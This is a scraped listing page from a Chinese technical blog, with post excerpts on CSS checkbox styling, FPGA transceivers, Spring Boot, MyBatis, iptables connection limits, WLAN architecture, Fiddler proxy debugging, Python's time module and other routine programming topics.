		概述 在页面设计时，我们经常使用input复选框。由于界面设计的需要，我们需要修改复选框的样式，使得界面更美观或者适应新的需求。由于CheckBox伪类修改比较复杂，通常修改的方式有两种，一个是链入图片，另一个是使用纯css的方法进行修改。链入图片的设计方式比较简单，但是需要预先设计或者下载图片，比较麻烦。纯css的方法，只需要在css文件中编写代码，个人觉得比较方便，因此，本文使用该方式对input中的CheckBox进行设置。
实现效果 本文在设计时，希望达到以下效果，如图所示，每个带颜色的方块都是有input框组成，每个input框的背景色不同，并且，再点击时，只能同时选中一个input框（实现效果相当于radio）。
实现步骤 1、单个input[type=checkbox]样式修改 在设计时，我们使用&lt;lable&gt;标签的for属性，绑定到input标签上（for属性应对应到input标签中的id）。在jsp代码中设计如下所示：
&lt;input id="color-input-red" class="chat-button-location-radio-input" type="checkbox" name="color-input-red" value="#f0544d" /&gt; &lt;label for="color-input-red"&gt;&lt;/label &gt; 接下来我们在css文件中设置lable标签的显示样式：
/*lable标签的大小、位置、背景颜色更改，在css选择时，“+”代表相邻元素，即当前元素的下一元素*/ #color-input-red +label{ display: block; width: 20px; height: 20px; cursor: pointer; position: absolute; top: 2px; left: 15px; background: rgba(240, 84, 77, 1);; } /*当input框为选中状态时，lable标签的样式，其中在css选择时，“：”表示当前input框的值，即checked； 该部分主要对显示的“对号”的大限居中方式，显示颜色进行了设置*/ #color-input-red:checked +label::before{ display: block; content: "\2714"; text-align: center; font-size: 16px; color: white; } 其中里面的content表示在方框中显示的内容，"\2714"、"\2713"都表示对号，只是显示的瘦弱程度不同，大家可以在调试的时候，选择其中一个。对于css中的内容，我们可以根据需要设置为自己的内容。
最后我们在css中将原先的input[type=checkbox]的内容进行隐藏。
input[type=checkbox]{ visibility: hidden; } 最终的显示效果如下：
2、实现多个input框样式的调整 单个input框实现完成以后，同理，其他的input框实现也据此实现。使用的jsp代码如下（里面的div标签只是为布局使用）：
&lt;div class="chat-windows-color-div row"&gt; &lt;div class="
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/9b2db68478f423ca2cae8533c412d289/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/af35feeab16196b5e11a39f130fc73bc/" rel="bookmark">
			SerDes，GTP , GTX , GTH理解
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		SerDes：是串行/解串器，也可以叫串行收发器 GT(包括GTX、GTH和GTP)：是Xilinx在高速SerDes的基础上，增加了其他模块，如8b/10b编解码等(具体可以看Xilinx相关文档，如ug476)形成的一个高速串行收发器，GT是Gigabit Transceiver的意思，它是实现当下一些高速串行接口的基础：如PCIe、RapidIO等
GTP , GTX , GTH都是串行收发器，区别在速率不一样，在不同的器件中叫的名字不同而已。
GTP: Gigabit Transceiver with Low Power
GT - Virtex-II ProGT10 - Virtex-II Pro XGT11 - Virtex-4 FXGTP - Virtex-5 LXT/SXTGTX - Virtex-5 FXT/TXT
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/9463369a90a0ad5759b6ee2d3ace2140/" rel="bookmark">
			excel 中输入数据后自动显示日期,显示插入数据的时间
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		选中C列，右键--“设置单元格格式”，选择数据格式为自定义，类型格式为yyyy/m/d h:mm:ss
2.接着在单元格C2中输入函数=IF(B2="","",IF(C2="",NOW(),C2))，很简单就两个多条件IF与NOW（)函数，具体的B2与C2根据实际变动
3.框选下拉，使得后面的单元格与设置为相应的公式函数，如图所示
4.接着点击文件，在弹出的菜单中，选择选项，进入到excel的选项中
5.excel选项界中，左侧选择公式，在计算选项栏中，点击启用迭代计算，即√选上即可，再点击确定
6.这样当完成输入后，就会自动生成记录相应的录入时间，如图所示
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/a740c26266259f3b744384198beb16ad/" rel="bookmark">
			如何高效使用idea进行Spring boot测试？
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		1. 利用idea创建Spring boot项目 1. 打开idea并选择创建新项目，进入如下页面,选择Spring Initializr,选择右侧jdk以及选择Custom,将地址修改为http://start.srping.io,选择Next,填写Group和artifct,选择Next
2. 进入如下页面，选择Spring boot的依赖文件，进入Next选择文件目录，最后选择完成 3. 产生如何项目结构
4.修改结构为Source root
2. 创建测试class 1. 创建一个新的class文件
2. 对改class创建测试文件，ctrl+shift+t,选择创建New Test
3. 选择junit4和方法
4. 产生如下结构
5.编写测试代码，点击右侧按钮进行run。
3.注意事项 1. 注意在test目录下的java目录，当你想使用resources目录作为test的目录时，直接将test下的目录作为Sources Root，当你想直接创建新的test resources将test/java修改为Test Resources Root。
2. 当idea无法识别时，注意引入相应的junit包和spring boot test包
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/f7ced336941e7fec74bf81ec8a872a64/" rel="bookmark">
			[蓝牙开发] CC2540新手学习之点亮LED
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		今天呢，继续上一章博客的内容，上一节我们讲了如何安装IAR编译软件的，今天就开始来写写第一个简单的程序吧，一起努力，一起进步。学之前呢，也并不是所以的小白都懂的，基础还是要有点C语言的基础，会简单的几个语句也可以完成我们这节要将的点亮LED的任务。
首先，安装好了IAR 打开我们的IAR
然后
创建后的图片就如下图
点击OK
就出现我们的第一个工程了
之后还需要创建.C为后缀文件，就是以后工程必不可少的main.c文件
点击保存，就创建好了一个完整的空白工程。
把我们的main.c文件添加进工程里
这样我们就可以开始把代码添加进去了，因为我们是CC2540 的版本不同的版本要对应不同的型号
这个是我写的代码，下面附上文字版方便复制粘贴
/**************************************/ /* CNPF科技 */ /* 蓝牙4.0开发CC2540 */ /*例程名称：点亮LED */ /*建立时间：2018/04/17 */ /*描述：点亮LED1 */ /***************************************/ #include&lt;ioCC2540.h&gt; #define LED P1_0 //定义P10口为LED控制端 void IO_Init(void) //这里是函数初始化打包 { P1DIR |= 0x01; //P1_0定义为输出 } void main(void) //主函数（程序首先第一步启动） { IO_Init(); //调用初始化程序 LED=1; //点亮LED1 while(1); //死循环 } 实验现象：可以在开发板上看到P1_0接口连的LED灯常亮。
开发板暂时没做，后期把自己的开发板做了再把相应的实验现象附上图片。有兴趣的可以联系私聊我。
好了，今天到此为止，明天更新LED的点亮所带来的灵活运用，和好玩之处。
希望看了我博客的，发现问题对我提出意见哈，一起进步，一起学习。
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/b1e5663eab7202276501d5f0f3122bbf/" rel="bookmark">
			Unity 获取唯一标识符的问题解决方案
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		环境：只适用于PC
一：遇到的坑
Unity 提供了给我一套获取硬件信息的API 链接 蛮牛上的一篇帖子：链接
文中都提到了一个获取设备的唯一标识符
但是我可以明确告诉你 这个值会改变（过一段时间就会变 就是被他坑了）
查看api文档
是根据主板序列号.BIOS序列号.cpu信息.硬盘序列号.操作系统信息 来进行加密或者其他算法得出的，也许是某个东西会随着时间而改变 导致整个获取的标识符是会改变的（行不通 GG）
二：第二种方法还是坑
既然不能通过SystemInfo来获取标识符 那么就想着能不能用C#相关api来获取，为此就找到一篇帖子：链接
然后在Unity风风火火的Copy代码。。。。BUT~居然获取不了 我真b了狗，起初我以为是我添加引入System.Management不对，
因为添加的是unity下面的，以为是unity进行阉割了所以不能获取
然后又在操作系统文件夹找的整个dll，最后发现还是不对，报错显示
猜想可能是mono虚拟机不支持，咋办呢？
三：解决方案
首先声明整个解决方案有点不太爽。。。。
虽然unity不能 但是我们能用c#来获取 于是乎 我就写了一个控制台程序 把获取cpu序列号什么的都写进去，然后发现成功了
（再次证实unity mono不能获取）
ojxk,然后我将获取的写入到了一个文本,如下代码：
class Program { static void Main(string[] args) { Console.WriteLine("start getserialnumber!!!"); //保存到当前路径 File.WriteAllText("pwd.txt", GetCpuID()+ GetDiskID()); Console.WriteLine("write end!!!"); Console.WriteLine("......."); Console.WriteLine("......."); } /// &lt;summary&gt; /// 获取cpu硬件信息 /// &lt;/summary&gt; /// &lt;returns&gt;&lt;/returns&gt; private static string GetCpuID() { try { string cpuInfo = "
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/b1e5663eab7202276501d5f0f3122bbf/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/e43c8371a08258617d186ef1ffc63b42/" rel="bookmark">
			MyBatis：支持定制化 SQL、存储过程以及高级映射的持久层框架
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		MyBatis 是支持定制化 SQL、存储过程以及高级映射的优秀持久层框架。MyBatis 避免了几乎所有的 JDBC 代码和手动设置参数以及获取结果集。MyBatis 可以对配置和原生Map使用简单的 XML 或注解，将接口和 Java 的 POJO（Plain Old Java Objects，普通的 Java对象）映射成数据库中的记录。
安装
直接导入jar包： 只需将 mybatis-x.x.x.jar 文件置于 classpath 中即可。使用Maven：需将下面的 dependency 代码置于 pom.xml 文件中： XHTML 1 2 3 4 5 &lt;dependency&gt; &lt;groupId&gt; org.mybatis &lt;/groupId&gt; &lt;artifactId&gt; mybatis &lt;/artifactId&gt; &lt;version&gt; x.x.x &lt;/version&gt; &lt;/dependency&gt; 构建 SqlSessionFactory
基于 MyBatis 的应用都是以 SqlSessionFactory 的实例为中心的。SqlSessionFactory 的实例可以通过 SqlSessionFactoryBuilder 获得。而 SqlSessionFactoryBuilder 则可以从 XML 配置文件或一个预先定制的 Configuration 的实例构建出 SqlSessionFactory 的实例。
1、从 XML 中构建 SqlSessionFactory
从 XML 文件中构建 SqlSessionFactory 的实例非常简单，建议使用类路径下的资源文件进行配置。
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/e43c8371a08258617d186ef1ffc63b42/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/baeaa370d2a4952499ff6539cf197345/" rel="bookmark">
			mac 中 history 命令使用与配置
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		在使用history命令查看之前执行的命令记录时，发现只是记录了很少的一部分，之前的很多记录都看不到了，就想到应该如何配置才能让history记录更多的命令，于是有了这篇记录。多数文章都是介绍Linux的history 命令使用与配置，MacOS是认证过的Unix，有些方面和 Linux 还不完全一样。
history命令清除命令执行操作的历史记录
history -c history命令列出最近执行的n条命令
history 10 重复执行上次操作的命令语法
!! 设置保存1000条操作命令
#设置历史命令记录数 export HISTSIZE=1000 #记录历史文件大小 export HISTFILESIZE=450 指定不同终端执行的命令都存储在同一个文件中
export HISTFILE=~/.commandline_warrior 忽略重复命令
export HISTCONTROL=ignoredups 多个终端同时操作时，避免命令覆盖，采用追加方式
shopt -s histappend 命令操作记录会在终端关闭结束工作后才会写入到history文件中，要想实现实时访问需要添加一下命令
PROMPT_COMMAND=’history -a’ history整体高级配置
vi ~/.bashrc 在文件末尾添加：
export HISTTIMEFORMAT="%Y-%M-%D %H:%M:%S " export HISTSIZE=100000 export HISTFILESIZE=1000000 export HISTFILE=~/.commandline_warrior shopt -s histappend PROMPT_COMMAND='history -a' 保存文件
按ESC，然后输入
:wq 回车，
为了使以上设置生效，执行以下命令
source ~/.bashrc 小结
其实绝大部分都是一样的，只是目录或文件名上有一点差别。
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/c03bdb8a882c2bfaff56516818c136fb/" rel="bookmark">
			iptables限制并发连接
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		 有A、B两台测试机与C一台主机，其中A测试机分为A1与A2窗口进行并发访问C，在C上设置同一IP访问限制为10个。
在C主机添加防火墙策略，对于input 8888端口 采用并发连接限制 同一个源并发量不超过10，否则拒绝
iptables -I INPUT -p tcp --dport 8888 -m connlimit --connlimit-above 10 -j REJECT 在A、B两台测试机上安装ab命令
yum install httpd-tools 安装后使用以下命令，指定连接数，每次并发数
ab -n 10000 -c 30 http://C主机IP:8888/index.html 在A1、A2、B两台服务器上使用ab命令进行请求，A1+A2并发量超过10就都会停止，提示以下错误，B只要不超过10即可正常请求。
apr_socket_recv: Connection refused (111) 对某个ip进行限制
iptables -I INPUT -p tcp --dport 8888 -s 192.168.31.207 -m connlimit --connlimit-above 10 -j REJECT 
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/6e8bfdca4cf286a62f02bf685675d055/" rel="bookmark">
			System Verilog与功能验证
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		第一章 功能验证技术与方法学概要 概念：
验证平台：testbench
测试用例：testcase
1.1.2 什么是验证 验证的种类：不同的阶段存在不同形式的验证
（1）寄存器传输级（RTL）的功能验证
（2）门级的仿真，为了验证综合后的网表和期望的功能是否一致
（3）形式验证（等价性检查）来确保门级网表和RTL代码的一致性
（4）时序验证，为了验证设计能否在特定的频率上运行，通常采用静态验证工具。
1.1.4 功能验证的流程 1. 制定验证策略和验证计划
（1）主要功能点和测试用例
（2）验证平台的抽象层次
（3）激励生成和结果检查原则 2.创建验证平台
书写验证平台代码和测试用例
3.回归测试（regression test）和覆盖率收敛阶段
1.2 验证技术和验证方法学 验证手段：白盒验证、黑盒验证、灰盒验证。
验证技术：形式验证、仿真验证、硬件加速验证。
验证方法学：随机激励生成、断言验证、覆盖率驱动验证。
1.2.2验证技术 1.形式验证
形式验证技术主要有
（1）等价性检查
（2）属性检查（验证断言）
2.仿真验证
3.硬件辅助加速验证
把设计映射到可配置平台，如FPGA，以便设计能在接近产品的时钟速度下运行。
1.2.5 断言验证（Assertion Based Verification，ABV） 断言，是一个必须验证的关于期望行为（属性）的声明或描述。（属性描述）。主要目的是保证设计和期望的一致性。
断言也被称为监控器或者检查器。
断言的优点在于提高了验证平台对设计内部的可见性，帮助工程师更快的定位问题的根源，缩短调试周期，提高功能覆盖率和加速系统集成。
1.2.6覆盖率驱动验证（Coverage Driven Verification，CDV） 覆盖率驱动验证是基于仿真的验证方法，解决当前验证项目面临的效率和完备性挑战。通过覆盖率驱动验证手段，可以再最短时间内验证尽可能多的情景，达到更高的覆盖率，改善验证的完备性和正确性。
覆盖率驱动验证最重要的特点是基于随机激励产生。是提高验证效率的原动力。
覆盖率驱动验证方法学把下面几个概念和技术融合到了一块：事务级验证、约束随机激励产生、自动化结果比较、覆盖率统计分析和直接测试。
1.事务级验证
1）数据和数据流在较高的抽象层次定义（例如帧和包）
2）验证场景在较高的抽象层次定义（例如写存储器、执行指令）
3）事务处理器吧这些抽象层次的数据和活动转换成低层次的操作和信号，以便应用到被测设计中。
2.约束随机激励生成
随机激励生成指的是利用随机生成技术来产生一个事务交易中所有的数据内容，同样产生一系列事务交易来形成一个特定的验证场景。
随机激励提高了验证效率，也有助于验证的完备性。
随机激励验证还需要（1）自动化结果检查（2）覆盖率统计和分析来保证真正的可靠性。
3.直接测试
手动创建测试用例，进行边界测试。
1.3 硬件验证语言 System Verilog的优点：
（1）单一，同时支持设计和验证的标准语言
（2）支持约束随机的常胜
（3）支持覆盖率统计分析
（4）支持断言验证
（5）面向对象的编程结构，有助于采用事务级的验证和提高验证的重用性。
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/6eb7a0a7e6a050af3586ae51a4367778/" rel="bookmark">
			WLAN从入门到精通（阅读总结）
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		WLAN从入门到精通系列文章可见： https://wenku.baidu.com/view/c34d5e1fe97101f69e3143323968011ca300f770.html 或 http://support.huawei.com/huaweiconnect/enterprise/zh/thread-282749.html
WLAN定义和基本框架 WLAN基本架构 WLAN有两种基本架构，一种是FAT AP架构，又叫自治式网络架构。一种是AC FIT AP架构，又叫集中式网络架构。
我们先从最熟悉的家庭无线路由器入手，家庭无线路由器采用的是FAT AP架构，即自治式网络架构。FAT AP英文全称是FAT Access Point，中文称为胖接入点，也有很多人直接称为胖AP。FAT AP不仅可以发射射频提供无线信号供无线终端接入，还能独立完成安全加密、用户认证和用户管理等管控功能。想一下我们家里的无线路由器，我们可以为WLAN设置密码，可以配置黑名单或白名单控制用户接入，还可以管理接入的用户（如设置用户的接入速率）等，这些都符合FAT AP的特征。所以，家庭使用的无线路由器就是一种FAT AP。下面的组网图是一个简单的基于FAT AP架构的组网应用。 FAT AP功能强大，独立性强，具备自治能力，因此FAT AP架构人们又称为自治式网络架构。不需要介入专门的管控设备，独自就可以完成无线用户的接入，业务数据的加密和业务数据报文的转发等功能。
独立自治是FAT AP的特点，也是FAT AP的缺点。当单个部署时，由于FAT AP具备较好的独立性，不需要另外部署管控设备，部署起来很方便，成本也较低廉，在类如家庭WLAN或者小企业WLAN的使用场景中，FAT AP往往是最适合的选择。给我们感受最深刻的就是我们在家里使用一个无线路由器就能享受WLAN带给我们的便捷。但是，在大的使用场景中，如我们上面提到的候车厅，FAT AP的独立自治就变成了自身的缺点。由于WLAN覆盖面积较大，接入用户较多，需要部署许多FAT AP设备，而每个FAT AP又是独立自治的，缺少统一的管控设备，管理这些设备就变得十分麻烦。不说别的，光为这些FAT AP升一次级就是一场灾难。所以，在大量部署的情况下，FAT AP会带来巨大的管理维护成本。而且由于独自控制用户的接入，FAT AP无法解决用户的漫游问题。一般在中大型使用场景中人们往往不会选择FAT AP架构，而是使用我们下面要讲的AC FIT AP架构。
FIT AP英文全称是FIT Access Point，中文称为瘦接入点，也有很多人直接称为瘦AP。和胖AP不同，瘦AP除了提供无线射频信号外，基本不具备管控功能。也正是因为这一点，它被称为瘦AP，而上面具备管控功能的AP被称为了胖AP。为了实现WLAN的功能，除了FIT AP外，还需要具备管理控制功能的设备——AC。AC英文全称是Access Controller，中文称为无线接入控制器。AC的主要功能是对WLAN中的所有FIT AP进行管理和控制，AC不具备射频（AC只是管理控制设备，不能发射无线射频信号），它和FIT AP配合共同完成WLAN功能。这种架构就被称为了AC FIT AP架构。 下图为某大型企业基于AC FIT AP架构部署的WLAN组网示意图。 由上图我们可以看到，根据AC所管控的区域和吞吐量的不同，AC可以出现在汇聚层，也可以出现在核心层。而FIT AP一般部署在接入层和企业分支。这种层级分明的协同分工，更能体现出AC FIT AP架构的集中控制的特点，这种架构又被大家称为集中式网络架构。
使用AC FIT AP架构为像候车厅这种大型场所部署WLAN时，比使用FAT AP架构更经济、高效。在AC FIT AP架构下，可以统一为FIT AP下发配置，统一为FIT AP进行软件升级，还可以按照时段控制FIT AP的工作数量等等，这些大大降低了WLAN的管控和维护的成本。而且，由于用户的接入认证可以由AC统一管理，解决用户漫游的问题就变得很容易。
综上所述，AC FIT AP架构适用于中大型使用场景，而FAT AP架构适用于小型使用场景。
WLAN射频和信道 射频 WLAN使用的射频频率范围是2.4GHz频段（2.4GHz～2.4835GHz）和5GHz频段（频率范围是5.150GHz～5.350GHz和5.725GHz～5.850GHz），分别属于特高频(300MHz～3GHz)和超高频(3GHz～30GHz)。
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/6eb7a0a7e6a050af3586ae51a4367778/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/771264fd35a78caa686cd9832497d427/" rel="bookmark">
			常用的网站链接
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		vuevue-routervuexElementUI 转载于:https://www.cnblogs.com/chengyuan1216/p/8847262.html
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/eaaa132b7c7807629009b87ce8963fa2/" rel="bookmark">
			DeepLearning - Overview of Sequence model
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		I have had a hard time trying to understand recurrent model. Compared to Ng's deep learning course, I found Deep Learning book written by Ian, Yoshua and Aaron much easier to understand.
This post is structure in following order:
Intuitive interpretation of RNNBasic RNN computation and different structureRNN limitation and variants Why we need Recurrent Neural Network The main reason behind Convolution neural network is using sparse connection and parameter sharing to reduce the scale of NN.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/eaaa132b7c7807629009b87ce8963fa2/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/18ba20f038948c383e6b85e06cf84bf7/" rel="bookmark">
			npm: command not found的解决方案
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		１、重装ｎｏｄｅｊｓ。
２、依次输入下列命令
sudo apt-get remove npm
sudo apt-get remove nodejs-legacy
sudo apt-get remove nodejs sudo rm /usr/bin/node sudo apt-get install nodejs sudo apt-get install nodejs-legacy sudo apt-get install npm.
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/18967d1973ddeadbf6d181143c16b43a/" rel="bookmark">
			ajax传输json数据格式以及规范
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		（1）
示例：
在JsonServlet中的代码：
import java.io.IOException;
import java.io.PrintWriter;
import javax.servlet.ServletException;
import javax.servlet.annotation.WebServlet;
import javax.servlet.http.HttpServlet;
import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;
/**
* Servlet implementation class JsonServlet
*/
@WebServlet("/JsonServlet")
public class JsonServlet extends HttpServlet {
private static final long serialVersionUID = 1L;
/**
* @see HttpServlet#HttpServlet()
*/
public JsonServlet() {
super();
// TODO Auto-generated constructor stub
}
/**
* @see HttpServlet#doGet(HttpServletRequest request, HttpServletResponse response)
*/
protected void doGet(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException {
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/18967d1973ddeadbf6d181143c16b43a/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/d3813151b34a3e692dfde5a02577db9d/" rel="bookmark">
			一次 java heap space 解决过程
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		负责一个javaweb项目，周四上午正在紧张的工作（划水），客户突然在群里喊了句正式服管理员账号登不上了。
赶紧打开网页&gt;开启调试模式&gt;登录，发现一个接口一直等待响应。postman掉一下，响应为空！喵喵喵，测试服试一下，接口报错 java heap space ？？？关于java heap space 原因请看这篇文章java 内存溢出 栈溢出的原因与排查方法
测试服和正式服同时出现问题，有人部署项目了？登录服务器，部署时间是上个月，帅锅计划失败。什么问题呢？稳定跑了一个月，代码出问题的可能性不大，数据库？ 连上数据库&gt;打开表，30w+？？？ 测试服务器9w+ 喵喵喵，我们的业务需求是不可能让这个表有这么多数据的，所以表的数据异常了！而我们测试服务器由于内存比较小，所以在select * 的时候直接堆溢出，报了 java heap space 异常，而正式服的虚拟机内存设置的比较高，所以不会溢出，但是由于表没有建索引（设计时考虑到数据不会太多，不建索引是正确的）查的慢，所以接口一直等待响应。
关于java head space 的解决方案也很简单，这里给大家贴一下
跟据网上的答案大致有这两种解决方法：
1、设置环境变量
set JAVA_OPTS= -Xms32m -Xmx512m
可以根据自己机器的内存进行更改,但本人测试这种方法并没有解决问题。可能是还有哪里需要设置。
2、java -Xms32m -Xmx800m className
就是在执行JAVA类文件时加上这个参数，其中className是需要执行的确类名。（包括包名）
这个解决问题了。而且执行的速度比没有设置的时候快很多。
但是这写方法并不适用我们遇到的问题，我们要解决的是数据重复的问题。
问题算是定位到了，但是数据为啥异常啊？？？好像有重复数据，SELECT count(id) from a group by id having count(id)&gt;1查一下，每条数据都重复了两千七百多次？？？哪来的这么多重复数据，主键也是重复的。最后发现是一个同事（实习生何苦为难实习生）写同步任务时复制了一行代码，把这个表也进行同步了。
接着就是解决问题了，删除多余同步代码，删除重复数据。然后就跳进了下一个坑mysql删除完全重复的数据（主键重复）
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/eef6ded1950875f7d00b1530b1bdb9b0/" rel="bookmark">
			JPA 判断字段值NULL
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		 由于又忘了，故备注于此。
字段值为NULL
sql：字段 is null 即可
但放到JPA 上，则是 ：
restrictions = criteriaBuilder.and(restrictions, criteriaBuilder.isNull(root.get("store"))); //还有多种的其它用法，isEmpty,isFalse 
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/2f3910d5aa7d85e5cdfffbcf395097b1/" rel="bookmark">
			Python网络爬虫笔记（4）HTTP代理神器Fiddler
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		Fiddler是一款强大Web调试工具，它能记录所有客户端和服务器的HTTP请求。 Fiddler启动的时候，默认IE的代理设为了127.0.0.1:8888，而其他浏览器是需要手动设置。
工作原理 Fiddler 是以代理web服务器的形式工作的，它使用代理地址：127.0.0.1，端口：8888
Fiddler抓取HTTPS设置 启动Fiddler，打开菜单栏中的 Tools &gt; Telerik Fiddler Options，打开“Fiddler Options”对话框。
对Fiddler进行设置：
打开工具栏-&gt;Tools-&gt;Fiddler Options-&gt;HTTPS，选中Capture HTTPS CONNECTs (捕捉HTTPS连接)，选中Decrypt HTTPS traffic（解密HTTPS通信）另外我们要用Fiddler获取本机所有进程的HTTPS请求，所以中间的下拉菜单中选中...from all processes （从所有进程）选中下方Ignore server certificate errors（忽略服务器证书错误）
为 Fiddler 配置Windows信任这个根证书解决安全警告：Trust Root Certificate（受信任的根证书）。
Fiddler 主菜单 Tools -&gt; Fiddler Options…-&gt; Connections
选中Allow remote computers to connect（允许远程连接）Act as system proxy on startup（作为系统启动代理）
重启Fiddler，使配置生效（这一步很重要，必须做）。
Fiddler 如何捕获Chrome的会话 安装SwitchyOmega 代理管理 Chrome 浏览器插件
如图所示，设置代理服务器为127.0.0.1:8888
通过浏览器插件切换为设置好的代理。
Fiddler界面 设置好后，本机HTTP通信都会经过127.0.0.1:8888代理，也就会被Fiddler拦截到。
请求 (Request) 部分详解 Headers —— 显示客户端发送到服务器的 HTTP 请求的 header，显示为一个分级视图，包含了 Web 客户端信息、Cookie、传输状态等。Textview —— 显示 POST 请求的 body 部分为文本。WebForms —— 显示请求的 GET 参数 和 POST body 内容。HexView —— 用十六进制数据显示请求。Auth —— 显示响应 header 中的 Proxy-Authorization(代理身份验证) 和 Authorization(授权) 信息.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/2f3910d5aa7d85e5cdfffbcf395097b1/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/c127d51aeb4ca88fe9bb232ab181933f/" rel="bookmark">
			python中time模块详解
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		在Python中，与时间处理有关的模块就包括：time，datetime以及calendar。这篇文章，主要讲解time模块。
在开始之前，首先要说明这几点：
在Python中，通常有这几种方式来表示时间：1）时间戳 2）格式化的时间字符串 3）元组（struct_time）共九个元素。由于Python的time模块实现主要调用C库，所以各个平台可能有所不同。
UTC（Coordinated Universal Time，世界协调时）亦即格林威治天文时间，世界标准时间。在中国为UTC+8。DST（Daylight Saving Time）即夏令时。
时间戳（timestamp）的方式：通常来说，时间戳表示的是从1970年1月1日00:00:00开始按秒计算的偏移量。我们运行“type(time.time())”，返回的是float类型。返回时间戳方式的函数主要有time()，clock()等。
元组（struct_time）方式：struct_time元组共有9个元素，返回struct_time的函数主要有gmtime()，localtime()，strptime()。下面列出这种方式元组中的几个元素：
索引（Index）属性（Attribute）值（Values）0 tm_year（年） 比如2011 1 tm_mon（月） 1 - 122 tm_mday（日） 1 - 313 tm_hour（时） 0 - 234 tm_min（分） 0 - 595 tm_sec（秒） 0 - 616 tm_wday（weekday） 0 - 6（0表示周日）7 tm_yday（一年中的第几天） 1 - 3668 tm_isdst（是否是夏令时） 默认为-1 接着介绍time模块中常用的几个函数：
1）time.localtime([secs])：将一个时间戳转换为当前时区的struct_time。secs参数未提供，则以当前时间为准。
&gt;&gt;&gt; time.localtime()time.struct_time(tm_year=2011, tm_mon=5, tm_mday=5, tm_hour=14, tm_min=14, tm_sec=50, tm_wday=3, tm_yday=125, tm_isdst=0)&gt;&gt;&gt; time.localtime(1304575584.1361799)time.struct_time(tm_year=2011, tm_mon=5, tm_mday=5, tm_hour=14, tm_min=6, tm_sec=24, tm_wday=3, tm_yday=125, tm_isdst=0)
2）time.gmtime([secs])：和localtime()方法类似，gmtime()方法是将一个时间戳转换为UTC时区（0时区）的struct_time。
&gt;&gt;&gt;time.gmtime()time.struct_time(tm_year=2011, tm_mon=5, tm_mday=5, tm_hour=6, tm_min=19, tm_sec=48, tm_wday=3, tm_yday=125, tm_isdst=0)
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/c127d51aeb4ca88fe9bb232ab181933f/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/ae0dc7c1965213c1b9682200628c62ea/" rel="bookmark">
			smoothL1 loss的tensorflow实现
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		MachineLP的Github（欢迎follow）：https://github.com/MachineLP
